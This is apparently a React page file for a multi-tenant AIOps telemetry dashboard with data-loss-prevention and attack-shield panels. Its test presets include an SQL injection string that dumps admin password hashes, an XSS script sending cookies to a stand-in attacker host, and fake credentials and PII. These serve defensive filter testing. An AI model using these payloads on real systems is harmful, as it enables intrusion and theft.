'use client';

import { useState, useEffect, useCallback } from 'react';

const PRESETS = {
  clean: {
    name: 'Clean Telemetry Metric',
    data: {
      sourceAlias: 'checkout-frontend',
      region: 'us-east-1',
      category: 'network',
      severity: 'low',
      latencyMs: 42,
      statusCode: 200,
      metrics: {
        requestCount: 1500,
        cacheHitRate: 0.94,
      },
      summary: 'Normal operational API traffic',
    },
  },
  leak: {
    name: 'Sensitive Credential & PII Leak (DLP Test)',
    data: {
      sourceAlias: 'customer-portal',
      region: 'us-east-1',
      userPayload: {
        rawMessage: 'Customer requested password reset and shared billing info',
        contactEmail: 'jane.doe@enterprise.com',
        userApiKey: 'sk-live-9872134091823091823091823',
        accountPassword: 'SuperSecretUserPassword2026!',
        creditCard: '4532-8765-4321-9988',
        ssn: '123-45-6789',
      },
      latencyMs: 110,
      statusCode: 200,
    },
  },
  sqli: {
    name: 'SQL Injection Attack (Shield Test)',
    data: {
      sourceAlias: 'untrusted-client-ip',
      region: 'us-east-1',
      endpoint: '/api/v1/auth/login',
      searchQuery: "admin' OR '1'='1' UNION SELECT username, password_hash FROM admin_users --",
      headers: {
        userAgent: 'Sqlmap/1.6.4#stable',
      },
    },
  },
  xss: {
    name: 'Cross-Site Scripting (XSS Attack Test)',
    data: {
      sourceAlias: 'public-forum-post',
      region: 'us-west-2',
      commentBody: '<script>fetch("https://evil-hacker.xyz/steal?c=" + document.cookie)</script>',
      author: 'anonymous',
    },
  },
};

export default function HomePage() {
  const [tenantId, setTenantId] = useState('tenant-enterprise-1');
  const [activeTab, setActiveTab] = useState('dashboard');
  const [loading, setLoading] = useState(false);
  const [actionMessage, setActionMessage] = useState(null);

  // AIOps intelligence data
  const [aiopsData, setAiopsData] = useState({
    healthScore: 100,
    healthStatus: 'HEALTHY',
    categoryHealth: {
      infra: { score: 100, status: 'HEALTHY', eventCount: 0, criticalCount: 0 },
      network: { score: 100, status: 'HEALTHY', eventCount: 0, criticalCount: 0 },
      security: { score: 100, status: 'HEALTHY', eventCount: 0, criticalCount: 0 },
      collector: { score: 100, status: 'HEALTHY', eventCount: 0, criticalCount: 0 },
    },
    isStale: false,
    summary: { totalEventsAnalyzed: 0, anomaliesCount: 0, activeIncidentsCount: 0, healthTrend: 'HEALTHY' },
    anomalies: [],
    incidents: [],
    recommendations: [],
  });

  // Collector security metrics
  const [collectorStats, setCollectorStats] = useState({
    totalReceived: 0,
    metadataForwarded: 0,
    rawFieldsStrippedCount: 0,
    leaksPrevented: 0,
    attacksBlocked: 0,
    attackBreakdown: {},
    leakBreakdown: {},
  });

  // Playground state
  const [playgroundInput, setPlaygroundInput] = useState(JSON.stringify(PRESETS.leak.data, null, 2));
  const [playgroundResult, setPlaygroundResult] = useState(null);
  const [playgroundRunning, setPlaygroundRunning] = useState(false);

  // Fetch telemetry & collector stats
  const refreshData = useCallback(async (currentTenant = tenantId) => {
    setLoading(true);
    try {
      // 1. Fetch AIOps intelligence
      const aiopsRes = await fetch(`/api/aiops?tenantId=${encodeURIComponent(currentTenant)}`);
      if (aiopsRes.ok) {
        const data = await aiopsRes.json();
        setAiopsData(data);
      }

      // 2. Fetch Collector security stats
      const collectorRes = await fetch('/api/collector');
      if (collectorRes.ok) {
        const cData = await collectorRes.json();
        if (cData.stats) setCollectorStats(cData.stats);
      }
    } catch (err) {
      console.error('Failed to refresh data', err);
    } finally {
      setLoading(false);
    }
  }, [tenantId]);

  useEffect(() => {
    refreshData();
  }, [refreshData]);

  // Run Simulation Scenario
  const handleRunSimulation = async (scenario) => {
    setLoading(true);
    setActionMessage({ type: 'info', text: `Triggering simulated scenario "${scenario}"...` });
    try {
      const res = await fetch('/api/simulate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ scenario, tenantId }),
      });
      const data = await res.json();
      if (res.ok) {
        setActionMessage({
          type: 'success',
          text: `Simulation "${scenario}" complete! Generated ${data.eventsGeneratedCount} events. ${
            data.correlatedIncident ? 'Correlated into 1 unified incident.' : ''
          }`,
        });
        await refreshData(tenantId);
      } else {
        setActionMessage({ type: 'error', text: data.error || 'Simulation failed' });
      }
    } catch (err) {
      setActionMessage({ type: 'error', text: 'Error executing simulation: ' + err.message });
    } finally {
      setLoading(false);
    }
  };

  // Submit to Collector Playground
  const handlePlaygroundSubmit = async () => {
    setPlaygroundRunning(true);
    setPlaygroundResult(null);
    try {
      let parsed;
      try {
        parsed = JSON.parse(playgroundInput);
      } catch {
        alert('Invalid JSON input format');
        setPlaygroundRunning(false);
        return;
      }

      const res = await fetch('/api/collector', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...parsed, tenantId }),
      });
      const data = await res.json();
      setPlaygroundResult({
        httpStatus: res.status,
        response: data,
      });
      await refreshData(tenantId);
    } catch (err) {
      setPlaygroundResult({
        httpStatus: 500,
        response: { error: err.message },
      });
    } finally {
      setPlaygroundRunning(false);
    }
  };

  // Status color mapper
  const getHealthColor = (status) => {
    switch (status) {
      case 'HEALTHY': return '#10b981';
      case 'DEGRADED': return '#f59e0b';
      case 'CRITICAL': return '#ef4444';
      case 'STALE': return '#eab308';
      default: return '#6b7280';
    }
  };

  const getSeverityBadge = (severity) => {
    const colors = {
      critical: { bg: 'rgba(239, 68, 68, 0.15)', text: '#ef4444', border: '#ef4444' },
      high: { bg: 'rgba(249, 115, 22, 0.15)', text: '#f97316', border: '#f97316' },
      medium: { bg: 'rgba(234, 179, 8, 0.15)', text: '#eab308', border: '#eab308' },
      low: { bg: 'rgba(59, 130, 246, 0.15)', text: '#3b82f6', border: '#3b82f6' },
    };
    const c = colors[severity] || colors.low;
    return (
      <span style={{
        padding: '3px 8px',
        borderRadius: '4px',
        fontSize: '0.72rem',
        fontWeight: '700',
        textTransform: 'uppercase',
        backgroundColor: c.bg,
        color: c.text,
        border: `1px solid ${c.border}`,
      }}>
        {severity}
      </span>
    );
  };

  return (
    <div style={{ maxWidth: '1440px', margin: '0 auto', padding: '24px 20px' }}>
      {/* Top Navigation */}
      <header style={{
        display: 'flex',
        flexWrap: 'wrap',
        justifyContent: 'space-between',
        alignItems: 'center',
        paddingBottom: '20px',
        borderBottom: '1px solid var(--border-subtle)',
        marginBottom: '28px',
        gap: '16px',
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          <div style={{
            width: '42px',
            height: '42px',
            borderRadius: '10px',
            background: 'linear-gradient(135deg, #00f0ff, #8b5cf6)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '1.4rem',
            boxShadow: 'var(--glow-cyan)',
          }}>
            ⚡
          </div>
          <div>
            <h1 style={{ fontSize: '1.35rem', fontWeight: '800', letterSpacing: '-0.5px' }}>
              CICADA <span style={{ color: 'var(--accent-cyan)' }}>//</span> AIOPS
            </h1>
            <p style={{ fontSize: '0.75rem', color: 'var(--text-muted)' }}>
              Multi-Tenant Telemetry & Edge Threat Shield
            </p>
          </div>
        </div>

        {/* Tenant selector & refresh */}
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          <div style={{
            display: 'flex',
            alignItems: 'center',
            background: 'var(--bg-secondary)',
            border: '1px solid var(--border-subtle)',
            borderRadius: '8px',
            padding: '4px 10px',
            fontSize: '0.82rem',
          }}>
            <span style={{ color: 'var(--text-dim)', marginRight: '8px' }}>Tenant:</span>
            <input
              type="text"
              value={tenantId}
              onChange={(e) => setTenantId(e.target.value)}
              onBlur={() => refreshData(tenantId)}
              style={{
                background: 'transparent',
                border: 'none',
                color: 'var(--text-main)',
                fontWeight: '600',
                outline: 'none',
                width: '150px',
              }}
            />
          </div>
          <button
            onClick={() => refreshData(tenantId)}
            disabled={loading}
            style={{
              background: 'var(--bg-secondary)',
              border: '1px solid var(--border-subtle)',
              color: 'var(--text-main)',
              borderRadius: '8px',
              padding: '7px 14px',
              fontSize: '0.82rem',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: '6px',
            }}
          >
            <span>🔄</span> {loading ? 'Refreshing...' : 'Refresh'}
          </button>
        </div>
      </header>

      {/* Notification banner */}
      {actionMessage && (
        <div style={{
          padding: '12px 16px',
          borderRadius: '8px',
          marginBottom: '20px',
          fontSize: '0.85rem',
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          backgroundColor: actionMessage.type === 'error' ? 'rgba(239, 68, 68, 0.15)' : 'rgba(0, 240, 255, 0.1)',
          border: `1px solid ${actionMessage.type === 'error' ? 'var(--accent-rose)' : 'var(--accent-cyan)'}`,
          color: actionMessage.type === 'error' ? '#fca5a5' : '#a5f3fc',
        }}>
          <span>{actionMessage.text}</span>
          <button
            onClick={() => setActionMessage(null)}
            style={{ background: 'transparent', border: 'none', color: 'inherit', cursor: 'pointer', fontSize: '1rem' }}
          >
            ✕
          </button>
        </div>
      )}

      {/* Top KPI Cards Row */}
      <section style={{
        display: 'grid',
        gridTemplateColumns: 'repeat(auto-fit, minmax(240px, 1fr))',
        gap: '16px',
        marginBottom: '24px',
      }}>
        {/* Health Score Card */}
        <div style={{
          background: 'var(--bg-card)',
          border: `1px solid ${getHealthColor(aiopsData.healthStatus)}55`,
          borderRadius: '12px',
          padding: '20px',
          boxShadow: aiopsData.healthStatus === 'CRITICAL' ? 'var(--glow-rose)' : 'var(--glow-emerald)',
        }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ fontSize: '0.8rem', color: 'var(--text-muted)', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
              System Health Score
            </span>
            <span style={{
              padding: '2px 8px',
              borderRadius: '12px',
              fontSize: '0.72rem',
              fontWeight: '700',
              backgroundColor: `${getHealthColor(aiopsData.healthStatus)}22`,
              color: getHealthColor(aiopsData.healthStatus),
              border: `1px solid ${getHealthColor(aiopsData.healthStatus)}`,
            }}>
              {aiopsData.healthStatus}
            </span>
          </div>
          <div style={{ display: 'flex', alignItems: 'baseline', gap: '8px', marginTop: '10px' }}>
            <span style={{ fontSize: '2.5rem', fontWeight: '800', color: getHealthColor(aiopsData.healthStatus) }}>
              {aiopsData.healthScore}
            </span>
            <span style={{ color: 'var(--text-dim)', fontSize: '1rem' }}>/ 100</span>
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-dim)', marginTop: '4px' }}>
            Trend: <strong style={{ color: 'var(--text-main)' }}>{aiopsData.summary?.healthTrend || 'STABLE'}</strong>
          </div>
        </div>

        {/* Active Incidents Card */}
        <div style={{
          background: 'var(--bg-card)',
          border: '1px solid var(--border-subtle)',
          borderRadius: '12px',
          padding: '20px',
        }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ fontSize: '0.8rem', color: 'var(--text-muted)', textTransform: 'uppercase' }}>
              Active Incidents
            </span>
            <span style={{ fontSize: '1.2rem' }}>🚨</span>
          </div>
          <div style={{ fontSize: '2.5rem', fontWeight: '800', marginTop: '10px', color: aiopsData.incidents?.length > 0 ? 'var(--accent-rose)' : 'var(--text-main)' }}>
            {aiopsData.incidents?.length || 0}
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-dim)', marginTop: '4px' }}>
            Correlated from raw alerts into unified incidents
          </div>
        </div>

        {/* Leaks Prevented Card */}
        <div style={{
          background: 'var(--bg-card)',
          border: '1px solid var(--border-subtle)',
          borderRadius: '12px',
          padding: '20px',
        }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ fontSize: '0.8rem', color: 'var(--text-muted)', textTransform: 'uppercase' }}>
              DLP Leaks Neutralized
            </span>
            <span style={{ fontSize: '1.2rem' }}>🔒</span>
          </div>
          <div style={{ fontSize: '2.5rem', fontWeight: '800', marginTop: '10px', color: 'var(--accent-cyan)' }}>
            {collectorStats.leaksPrevented}
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-dim)', marginTop: '4px' }}>
            API keys, tokens, passwords & credit cards redacted
          </div>
        </div>

        {/* Attacks Blocked Card */}
        <div style={{
          background: 'var(--bg-card)',
          border: '1px solid var(--border-subtle)',
          borderRadius: '12px',
          padding: '20px',
        }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ fontSize: '0.8rem', color: 'var(--text-muted)', textTransform: 'uppercase' }}>
              Threats Shielded
            </span>
            <span style={{ fontSize: '1.2rem' }}>🛡️</span>
          </div>
          <div style={{ fontSize: '2.5rem', fontWeight: '800', marginTop: '10px', color: 'var(--accent-purple)' }}>
            {collectorStats.attacksBlocked}
          </div>
          <div style={{ fontSize: '0.75rem', color: 'var(--text-dim)', marginTop: '4px' }}>
            DDoS floods, SQLi, XSS & command injections blocked
          </div>
        </div>
      </section>

      {/* Interactive Simulation Action Bar */}
      <section style={{
        background: 'linear-gradient(90deg, rgba(13, 18, 29, 0.9), rgba(26, 34, 52, 0.9))',
        border: '1px solid var(--border-subtle)',
        borderRadius: '12px',
        padding: '16px 20px',
        marginBottom: '28px',
        display: 'flex',
        flexWrap: 'wrap',
        alignItems: 'center',
        justifyContent: 'space-between',
        gap: '12px',
      }}>
        <div>
          <span style={{ fontSize: '0.75rem', fontWeight: '700', color: 'var(--accent-cyan)', textTransform: 'uppercase', letterSpacing: '1px' }}>
            Simulated Telemetry Scenarios
          </span>
          <p style={{ fontSize: '0.82rem', color: 'var(--text-muted)' }}>
            Inject live operational scenarios into the database and test real-time AI handling
          </p>
        </div>

        <div style={{ display: 'flex', flexWrap: 'wrap', gap: '10px' }}>
          <button
            onClick={() => handleRunSimulation('spikes')}
            disabled={loading}
            style={{
              background: 'rgba(59, 130, 246, 0.15)',
              border: '1px solid #3b82f6',
              color: '#93c5fd',
              borderRadius: '8px',
              padding: '8px 16px',
              fontSize: '0.82rem',
              fontWeight: '600',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: '6px',
            }}
          >
            <span>⚡</span> Simulate Spikes
          </button>

          <button
            onClick={() => handleRunSimulation('outages')}
            disabled={loading}
            style={{
              background: 'rgba(239, 68, 68, 0.15)',
              border: '1px solid #ef4444',
              color: '#fca5a5',
              borderRadius: '8px',
              padding: '8px 16px',
              fontSize: '0.82rem',
              fontWeight: '600',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: '6px',
            }}
          >
            <span>💥</span> Simulate Outage
          </button>

          <button
            onClick={() => handleRunSimulation('failed_logins')}
            disabled={loading}
            style={{
              background: 'rgba(139, 92, 246, 0.15)',
              border: '1px solid #8b5cf6',
              color: '#d8b4fe',
              borderRadius: '8px',
              padding: '8px 16px',
              fontSize: '0.82rem',
              fontWeight: '600',
              cursor: 'pointer',
              display: 'flex',
              alignItems: 'center',
              gap: '6px',
            }}
          >
            <span>🛡️</span> Simulate Attack
          </button>
        </div>
      </section>

      {/* Navigation Tabs */}
      <nav style={{
        display: 'flex',
        borderBottom: '1px solid var(--border-subtle)',
        marginBottom: '24px',
        gap: '4px',
      }}>
        {[
          { id: 'dashboard', label: '📊 Health & AIOps' },
          { id: 'shield', label: '🛡️ Threat Shield & DLP' },
          { id: 'playground', label: '🧪 Collector Playground' },
          { id: 'api', label: '🔌 API Architecture' },
        ].map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id)}
            style={{
              background: activeTab === tab.id ? 'var(--bg-card)' : 'transparent',
              border: 'none',
              borderBottom: activeTab === tab.id ? '2px solid var(--accent-cyan)' : '2px solid transparent',
              color: activeTab === tab.id ? 'var(--text-main)' : 'var(--text-muted)',
              padding: '10px 18px',
              fontSize: '0.88rem',
              fontWeight: activeTab === tab.id ? '700' : '500',
              cursor: 'pointer',
              transition: 'all 0.2s ease',
            }}
          >
            {tab.label}
          </button>
        ))}
      </nav>

      {/* Tab 1: Dashboard & AIOps Analysis */}
      {activeTab === 'dashboard' && (
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(360px, 1fr))', gap: '24px' }}>
          {/* Category Health Breakdown */}
          <div style={{
            background: 'var(--bg-card)',
            border: '1px solid var(--border-subtle)',
            borderRadius: '12px',
            padding: '24px',
          }}>
            <h3 style={{ fontSize: '1rem', fontWeight: '700', marginBottom: '16px', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <span>📡</span> Domain Health Breakdown
            </h3>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
              {Object.entries(aiopsData.categoryHealth || {}).map(([cat, stats]) => (
                <div key={cat} style={{ background: 'var(--bg-secondary)', padding: '12px 14px', borderRadius: '8px', border: '1px solid var(--border-subtle)' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
                    <span style={{ textTransform: 'capitalize', fontWeight: '600', fontSize: '0.85rem' }}>{cat}</span>
                    <span style={{ fontSize: '0.85rem', fontWeight: '700', color: getHealthColor(stats.status) }}>
                      {stats.score} / 100 ({stats.status})
                    </span>
                  </div>
                  <div style={{ width: '100%', height: '6px', background: 'rgba(255, 255, 255, 0.08)', borderRadius: '3px', overflow: 'hidden' }}>
                    <div style={{
                      width: `${stats.score}%`,
                      height: '100%',
                      background: getHealthColor(stats.status),
                      transition: 'width 0.4s ease',
                    }} />
                  </div>
                  <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.72rem', color: 'var(--text-dim)', marginTop: '4px' }}>
                    <span>Events: {stats.eventCount}</span>
                    <span>Critical Alerts: {stats.criticalCount}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Anomaly Detection Feed */}
          <div style={{
            background: 'var(--bg-card)',
            border: '1px solid var(--border-subtle)',
            borderRadius: '12px',
            padding: '24px',
          }}>
            <h3 style={{ fontSize: '1rem', fontWeight: '700', marginBottom: '16px', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <span>📈</span> Baseline Anomaly Detection
            </h3>
            {(!aiopsData.anomalies || aiopsData.anomalies.length === 0) ? (
              <div style={{ padding: '30px', textAlign: 'center', color: 'var(--text-dim)', fontSize: '0.85rem' }}>
                ✅ No statistical anomalies detected. All metric series conform to established baseline (Z &lt; 2.0).
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', maxHeight: '360px', overflowY: 'auto' }}>
                {aiopsData.anomalies.slice(0, 6).map((anom, idx) => (
                  <div key={idx} style={{
                    background: 'var(--bg-secondary)',
                    border: '1px solid rgba(239, 68, 68, 0.25)',
                    borderRadius: '8px',
                    padding: '10px 14px',
                    fontSize: '0.8rem',
                  }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
                      <span style={{ fontWeight: '600', color: 'var(--accent-rose)' }}>{anom.sourceAlias} ({anom.category})</span>
                      <span style={{ color: 'var(--text-dim)' }}>Score: {anom.anomalyScore}</span>
                    </div>
                    <ul style={{ paddingLeft: '18px', color: 'var(--text-muted)' }}>
                      {anom.reasons?.map((r, rIdx) => (
                        <li key={rIdx}>{r}</li>
                      ))}
                    </ul>
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Correlated Incidents & Explainable Recommendations (Full Width) */}
          <div style={{
            gridColumn: '1 / -1',
            background: 'var(--bg-card)',
            border: '1px solid var(--border-subtle)',
            borderRadius: '12px',
            padding: '24px',
          }}>
            <h3 style={{ fontSize: '1rem', fontWeight: '700', marginBottom: '16px', display: 'flex', alignItems: 'center', gap: '8px' }}>
              <span>🔍</span> Correlated Incidents & Explainable Root Cause Analysis (RCA)
            </h3>

            {(!aiopsData.incidents || aiopsData.incidents.length === 0) ? (
              <div style={{ padding: '40px', textAlign: 'center', color: 'var(--text-dim)', fontSize: '0.85rem' }}>
                No active operational incidents. System is healthy. Click one of the simulation buttons above to trigger a test incident.
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '18px' }}>
                {aiopsData.incidents.map((inc) => (
                  <div key={inc.incidentId} style={{
                    background: 'var(--bg-secondary)',
                    border: '1px solid var(--border-accent)',
                    borderRadius: '10px',
                    padding: '18px',
                  }}>
                    <div style={{ display: 'flex', flexWrap: 'wrap', justifyContent: 'space-between', alignItems: 'center', gap: '10px', marginBottom: '12px' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                        {getSeverityBadge(inc.severity)}
                        <h4 style={{ fontSize: '0.95rem', fontWeight: '700' }}>{inc.title}</h4>
                      </div>
                      <span style={{ fontSize: '0.75rem', color: 'var(--text-dim)' }}>
                        Status: <strong style={{ color: 'var(--accent-cyan)' }}>{inc.status}</strong> | Events: {inc.eventCount}
                      </span>
                    </div>

                    {/* RCA Box */}
                    {inc.rca && (
                      <div style={{
                        background: 'rgba(0, 0, 0, 0.35)',
                        borderLeft: '3px solid var(--accent-cyan)',
                        padding: '12px 16px',
                        borderRadius: '0 8px 8px 0',
                        marginBottom: '14px',
                      }}>
                        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
                          <span style={{ fontSize: '0.75rem', fontWeight: '700', color: 'var(--accent-cyan)', textTransform: 'uppercase' }}>
                            Probable Root Cause (Diagnostic Confidence: {Math.round((inc.rca.confidence || 0.8) * 100)}%)
                          </span>
                        </div>
                        <p style={{ fontSize: '0.85rem', color: 'var(--text-main)', marginBottom: '8px' }}>
                          {inc.rca.probableRootCause}
                        </p>

                        {/* Causal Chain */}
                        {inc.rca.causalChain && inc.rca.causalChain.length > 0 && (
                          <div style={{ marginTop: '8px' }}>
                            <span style={{ fontSize: '0.72rem', color: 'var(--text-dim)', fontWeight: '600' }}>Causal Propagation Chain:</span>
                            <div style={{ display: 'flex', flexDirection: 'column', gap: '4px', marginTop: '4px' }}>
                              {inc.rca.causalChain.map((step, sIdx) => (
                                <div key={sIdx} style={{ fontSize: '0.75rem', color: 'var(--text-muted)', fontFamily: 'monospace' }}>
                                  → {step}
                                </div>
                              ))}
                            </div>
                          </div>
                        )}
                      </div>
                    )}

                    {/* Prescriptive Recommendations / Runbooks */}
                    {inc.recommendations && inc.recommendations.length > 0 && (
                      <div>
                        <span style={{ fontSize: '0.75rem', fontWeight: '700', color: 'var(--text-muted)', textTransform: 'uppercase' }}>
                          Prescriptive Remediation Runbooks:
                        </span>
                        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '10px', marginTop: '8px' }}>
                          {inc.recommendations.map((rec) => (
                            <div key={rec.id} style={{
                              background: 'rgba(255, 255, 255, 0.03)',
                              border: '1px solid var(--border-subtle)',
                              borderRadius: '6px',
                              padding: '10px 12px',
                            }}>
                              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
                                <span style={{ fontSize: '0.78rem', fontWeight: '700', color: 'var(--accent-cyan)' }}>
                                  {rec.title}
                                </span>
                                <span style={{ fontSize: '0.68rem', color: 'var(--accent-amber)', fontWeight: '600' }}>{rec.priority}</span>
                              </div>
                              <p style={{ fontSize: '0.74rem', color: 'var(--text-muted)', marginBottom: '6px' }}>
                                {rec.description}
                              </p>
                              {rec.command && (
                                <div style={{
                                  background: '#04060a',
                                  padding: '4px 8px',
                                  borderRadius: '4px',
                                  fontSize: '0.7rem',
                                  color: '#38bdf8',
                                  fontFamily: 'monospace',
                                  overflowX: 'auto',
                                }}>
                                  $ {rec.command}
                                </div>
                              )}
                            </div>
                          ))}
                        </div>
                      </div>
                    )}
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Tab 2: Threat Shield & DLP */}
      {activeTab === 'shield' && (
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(360px, 1fr))', gap: '24px' }}>
          {/* DLP Breakdown */}
          <div style={{
            background: 'var(--bg-card)',
            border: '1px solid var(--border-subtle)',
            borderRadius: '12px',
            padding: '24px',
          }}>
            <h3 style={{ fontSize: '1rem', fontWeight: '700', marginBottom: '8px', color: 'var(--accent-cyan)' }}>
              🔒 Data Loss Prevention (DLP)
            </h3>
            <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginBottom: '18px' }}>
              Scans all incoming payloads to eliminate sensitive data before sending operational telemetry.
            </p>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
              {[
                { type: 'API & Cloud Keys (OpenAI, AWS, GitHub)', count: collectorStats.leakBreakdown?.API_KEY || 0 },
                { type: 'Bearer & JWT Authentication Tokens', count: collectorStats.leakBreakdown?.BEARER_TOKEN || 0 },
                { type: 'Passwords & Plaintext Credentials', count: collectorStats.leakBreakdown?.PASSWORD || 0 },
                { type: 'Credit Card Numbers (PCI-DSS)', count: collectorStats.leakBreakdown?.CREDIT_CARD || 0 },
                { type: 'Social Security Numbers (SSN)', count: collectorStats.leakBreakdown?.SSN || 0 },
                { type: 'Personal Email Addresses (PII)', count: collectorStats.leakBreakdown?.EMAIL || 0 },
              ].map((item, idx) => (
                <div key={idx} style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center',
                  background: 'var(--bg-secondary)',
                  padding: '10px 14px',
                  borderRadius: '6px',
                  border: '1px solid var(--border-subtle)',
                }}>
                  <span style={{ fontSize: '0.82rem' }}>{item.type}</span>
                  <span style={{
                    fontSize: '0.82rem',
                    fontWeight: '700',
                    color: item.count > 0 ? 'var(--accent-cyan)' : 'var(--text-dim)',
                  }}>
                    {item.count} neutralized
                  </span>
                </div>
              ))}
            </div>
          </div>

          {/* Attack Shield Breakdown */}
          <div style={{
            background: 'var(--bg-card)',
            border: '1px solid var(--border-subtle)',
            borderRadius: '12px',
            padding: '24px',
          }}>
            <h3 style={{ fontSize: '1rem', fontWeight: '700', marginBottom: '8px', color: 'var(--accent-purple)' }}>
              🛡️ Edge Threat Shield & Anti-Abuse
            </h3>
            <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginBottom: '18px' }}>
              Detects, neutralizes, and logs attacks before they reach backend microservices.
            </p>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
              {[
                { name: 'SQL Injection (SQLi)', count: collectorStats.attackBreakdown?.SQL_INJECTION || 0 },
                { name: 'Cross-Site Scripting (XSS)', count: collectorStats.attackBreakdown?.XSS_ATTACK || 0 },
                { name: 'Remote Command Execution (RCE)', count: collectorStats.attackBreakdown?.COMMAND_INJECTION || 0 },
                { name: 'Volumetric Flood & DDoS Attacks', count: collectorStats.attackBreakdown?.DDOS_FLOOD || 0 },
                { name: 'Payload Bombs & Depth Exploits', count: collectorStats.attackBreakdown?.PAYLOAD_BOMB || 0 },
                { name: 'Rate Limit Threshold Breaches', count: collectorStats.attackBreakdown?.RATE_LIMIT_EXCEEDED || 0 },
              ].map((item, idx) => (
                <div key={idx} style={{
                  display: 'flex',
                  justifyContent: 'space-between',
                  alignItems: 'center',
                  background: 'var(--bg-secondary)',
                  padding: '10px 14px',
                  borderRadius: '6px',
                  border: '1px solid var(--border-subtle)',
                }}>
                  <span style={{ fontSize: '0.82rem' }}>{item.name}</span>
                  <span style={{
                    fontSize: '0.82rem',
                    fontWeight: '700',
                    color: item.count > 0 ? 'var(--accent-rose)' : 'var(--text-dim)',
                  }}>
                    {item.count} blocked
                  </span>
                </div>
              ))}
            </div>
          </div>

          {/* Privacy Guarantee Panel */}
          <div style={{
            gridColumn: '1 / -1',
            background: 'rgba(0, 240, 255, 0.05)',
            border: '1px solid var(--border-accent)',
            borderRadius: '12px',
            padding: '20px',
            display: 'flex',
            alignItems: 'center',
            gap: '16px',
          }}>
            <div style={{ fontSize: '2rem' }}>🔐</div>
            <div>
              <h4 style={{ fontSize: '0.95rem', fontWeight: '700', color: 'var(--accent-cyan)' }}>
                Zero-Raw-Data Privacy Guarantee
              </h4>
              <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)' }}>
                The Local Collector automatically strips all raw input text, query parameters, and message bodies.
                Only operational telemetry metadata (payload byte size, field counts, structural SHA-256 fingerprint, status codes, latency)
                is ever forwarded to the upstream telemetry engine.
              </p>
            </div>
          </div>
        </div>
      )}

      {/* Tab 3: Interactive Playground */}
      {activeTab === 'playground' && (
        <div style={{
          background: 'var(--bg-card)',
          border: '1px solid var(--border-subtle)',
          borderRadius: '12px',
          padding: '24px',
        }}>
          <h3 style={{ fontSize: '1rem', fontWeight: '700', marginBottom: '8px' }}>
            🧪 Interactive Telemetry & Security Playground
          </h3>
          <p style={{ fontSize: '0.8rem', color: 'var(--text-muted)', marginBottom: '16px' }}>
            Send arbitrary raw client JSON to <code>POST /api/collector</code> and witness raw data redaction, DLP leak shielding, and attack neutralization in real-time.
          </p>

          {/* Preset Buttons */}
          <div style={{ display: 'flex', flexWrap: 'wrap', gap: '8px', marginBottom: '16px' }}>
            {Object.entries(PRESETS).map(([key, preset]) => (
              <button
                key={key}
                onClick={() => setPlaygroundInput(JSON.stringify(preset.data, null, 2))}
                style={{
                  background: 'var(--bg-secondary)',
                  border: '1px solid var(--border-subtle)',
                  color: 'var(--text-main)',
                  borderRadius: '6px',
                  padding: '6px 12px',
                  fontSize: '0.78rem',
                  cursor: 'pointer',
                }}
              >
                {preset.name}
              </button>
            ))}
          </div>

          {/* Side by side code view */}
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(320px, 1fr))', gap: '16px' }}>
            {/* Input Editor */}
            <div>
              <label style={{ fontSize: '0.75rem', fontWeight: '700', color: 'var(--text-dim)', textTransform: 'uppercase' }}>
                Raw User Payload (Input):
              </label>
              <textarea
                value={playgroundInput}
                onChange={(e) => setPlaygroundInput(e.target.value)}
                rows={14}
                style={{
                  width: '100%',
                  marginTop: '6px',
                  background: '#04060a',
                  border: '1px solid var(--border-subtle)',
                  borderRadius: '8px',
                  padding: '12px',
                  color: '#e2e8f0',
                  fontFamily: 'monospace',
